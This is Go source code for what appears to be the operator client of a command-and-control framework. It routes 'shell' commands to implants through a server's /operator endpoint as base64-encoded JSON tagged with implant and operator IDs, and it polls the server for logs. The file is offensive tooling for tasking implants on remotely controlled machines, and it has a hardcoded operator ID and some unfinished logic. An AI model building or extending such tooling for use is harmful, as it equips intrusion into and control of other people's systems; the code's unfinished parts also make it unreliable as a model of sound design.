package Client

import (
	"Operator/Common"
	"sync"
	"fmt"
	"encoding/json"
	"io/ioutil"
	"bytes"
    "encoding/base64"
	"strings"
	"time"
	"net/http"
	"github.com/gotk3/gotk3/gtk"
)

const (
    operatorID = "123abc" // Will later be used with authentication
)

type Command struct {
    Group    string `json:"Group"`
    String   string `json:"String"`
    Response string `json:"Response"`
}

var ID_Set bool
var response string

var port string
var defaultPort = "8443"

var routeMutex sync.Mutex 

func InitConnection() { // Add mutex so this can be used to check connections continuosly
    if Common.ServerURL == "" {
        defaultIP, err := getIP()
        if err != nil {
            Text := "Failed to set an address for the server"
            Common.InsertLogText(Text)
        }
        port = defaultPort
        url := "http://" + defaultIP + ":" + port
		Common.ServerURL = url
    }

    if verifyServerUp(Common.ServerURL) {
        Text := "<span>Connected to server: <span foreground=\"" + Common.AllWhite + "\">" + Common.ServerURL + "</span></span>"
		Common.InsertLogMarkup(Text)

    } else {
        Text := "<span foreground=\"" + Common.BrightRed + "\">Unable to connect to server: <span foreground=\"" + Common.AllWhite + "\">" + Common.ServerURL + "</span></span>"
        Common.InsertLogMarkup(Text)
    }
}

func UpdateLog() { 
	for {
		cmdGroup := "log"
		cmdString := ""
		responseChan := make(chan string)
		go func() {
			ServerCommand(cmdGroup, cmdString, responseChan)
		}()
		// Wait for the response or timeout
		select {
		case logText := <-responseChan:
			if logText != "" {
				Common.InsertLogMarkup(logText)
			}
		
		case <-time.After(5 * time.Second):
		}

		// Sleep for 5 seconds before fetching logs again
		time.Sleep(5 * time.Second)
	}
}


func RouteCMD(input string, responseChan chan<- string, buffer *gtk.TextBuffer, entry *gtk.Entry) {
    routeMutex.Lock()
    defer routeMutex.Unlock()
	// Trim spaces and newline characters from the input
	input = strings.TrimSpace(input)
	
	// Parse the input command
	parts := strings.Fields(input)
	if len(parts) < 2 {
		output := "Invalid command. Please provide a command group and a command.\n"
		warn := true
		Common.HandleAlerts(output, buffer, warn)
		return
	}

	cmdGroup := parts[0]
	switch cmdGroup {
	case "shell":
		Common.ImplantCmd = true
	case "implant":
		ID_Set = false
		for _, part := range parts {
			if strings.HasPrefix(part, "-s") {
				fmt.Println("Remove this")
			}
		}
		if !ID_Set {
			Common.ServerCmd = true
		}
		
	default:
		output := "Invalid command group\n"
		warn := true
		Common.HandleAlerts(output, buffer, warn)
		return
	}
	cmdString := strings.Join(parts[1:], " ")

	if Common.ImplantCmd {
		err := ImplantCommand(cmdGroup, cmdString, responseChan, Common.CurrentBuffer, Common.CurrentID)
		if err != nil {
			output := fmt.Sprintf("Error sending command: %v\n", err)
			warn := true
			Common.HandleAlerts(output, buffer, warn)
			return
		}
	}
	
	if Common.ServerCmd {
		
		err := ServerCommand(cmdGroup, cmdString, responseChan)
		if err != nil {
			output := fmt.Sprintf("Error sending command: %v\n", err)
			warn := true
			Common.HandleAlerts(output, buffer, warn)
			return
		}
	}
}

func ImplantCommand(cmdGroup, cmdString string, responseChan chan<- string, buffer *gtk.TextBuffer, implantID string) error {

	endpoint := "/operator"
	server := Common.ServerURL + endpoint
	client := &http.Client{}

	commandURL := server

	cmdData := Command{
		Group:   cmdGroup,
		String:  cmdString,
		Response: "", 
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Send request to server
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
	// Serialize command data to JSON
	jsonData, err := json.Marshal(cmdData)
	if err != nil {
		return fmt.Errorf("error marshaling JSON data: %w", err)
	}

	// Base64 encode the JSON data
	base64Data := base64.StdEncoding.EncodeToString(jsonData)

	// Create HTTP request
	req, err := http.NewRequest("POST", commandURL, bytes.NewBuffer([]byte(base64Data)))
	if err != nil {
		return fmt.Errorf("error creating HTTP request: %w", err)
	}
	req.Header.Set("Content-Type", "text/plain") // Set content type to text/plain
	req.Header.Set("Operator-ID", operatorID)
	req.Header.Set("Implant-ID", implantID)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return err
	} else {
		output := "Task sent to implant\n"
		warn := false
		Common.HandleAlerts(output, buffer, warn)
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Receive response from server
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	var responseBytes []byte
	var responseBody string
	var decodedData []byte
	for {
		// Read the response
		responseBytes, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			return fmt.Errorf("error reading response body: %w", err)
		}
		responseBody = string(responseBytes) // Convert []byte to string
	// Extract and decode data value
		dataIndex := strings.Index(responseBody, "Data:")
		if dataIndex != -1 {
			data := strings.TrimSpace(responseBody[dataIndex+len("Data:"):])
			decodedData, err = base64.StdEncoding.DecodeString(data)
			if err != nil {
				return fmt.Errorf("error decoding base64 data: %w", err)
			}
		} else {
			output := "No data found in the response\n"
			warn := true
			Common.HandleAlerts(output, buffer, warn)
		}
		if len(responseBody) > 0 {
			output := "Received ouput\n"
			warn := false
			Common.HandleAlerts(output, buffer, warn)
			break
		}
		time.Sleep(100 * time.Millisecond) // Wait for a short duration before trying again
	}


	// Unmarshal JSON
	var respstruct Command

	// Trim leading and trailing whitespace
	decodedData = bytes.TrimSpace(decodedData)

	err = json.Unmarshal(decodedData, &respstruct)
	if err != nil {
	return fmt.Errorf("Failed to unmarshal JSON: %s", err)
	}

	responseChan <- respstruct.Response
	defer resp.Body.Close()
	return nil
}


func ServerCommand(cmdGroup, cmdString string, responseChan chan<- string) error {

	endpoint := "/info"
	server := Common.ServerURL + endpoint
	client := &http.Client{}

	commandURL := server

	cmdData := Command{
		Group:   cmdGroup,
		String:  cmdString,
		Response: "", 
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Send request to server
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
	// Serialize command data to JSON
	jsonData, err := json.Marshal(cmdData)
	if err != nil {
		return fmt.Errorf("error marshaling JSON data: %w", err)
	}

	// Base64 encode the JSON data
	base64Data := base64.StdEncoding.EncodeToString(jsonData)

	// Create HTTP request
	req, err := http.NewRequest("GET", commandURL, bytes.NewBuffer([]byte(base64Data)))
	if err != nil {
		return fmt.Errorf("error creating HTTP request: %w", err)
	}
	req.Header.Set("Content-Type", "text/plain") // Set content type to text/plain
	req.Header.Set("Operator-ID", operatorID)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return err
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Receive response from server
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
	var responseBytes []byte
	var responseBody string
	var decodedData []byte
	for {
		// Read the response
		responseBytes, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			return fmt.Errorf("error reading response body: %w", err)
		}
		responseBody = string(responseBytes) // Convert []byte to string
	// Extract and decode data value
		dataIndex := strings.Index(responseBody, "Data:")
		if dataIndex != -1 {
			data := strings.TrimSpace(responseBody[dataIndex+len("Data:"):])
			decodedData, err = base64.StdEncoding.DecodeString(data)
			if err != nil {
				return fmt.Errorf("error decoding base64 data: %w", err)
			}
		} else {
			fmt.Println("Data not found in response")
		}
		if len(responseBody) > 0 {
			break
		}
		time.Sleep(100 * time.Millisecond) // Wait for a short duration before trying again
	}

	// Unmarshal JSON
	var respstruct Command

	// Trim leading and trailing whitespace
	decodedData = bytes.TrimSpace(decodedData)

	err = json.Unmarshal(decodedData, &respstruct)
	if err != nil {
		return fmt.Errorf("Failed to unmarshal JSON: %s", err)
	}

	responseChan <- respstruct.Response
	defer resp.Body.Close()
	return nil
}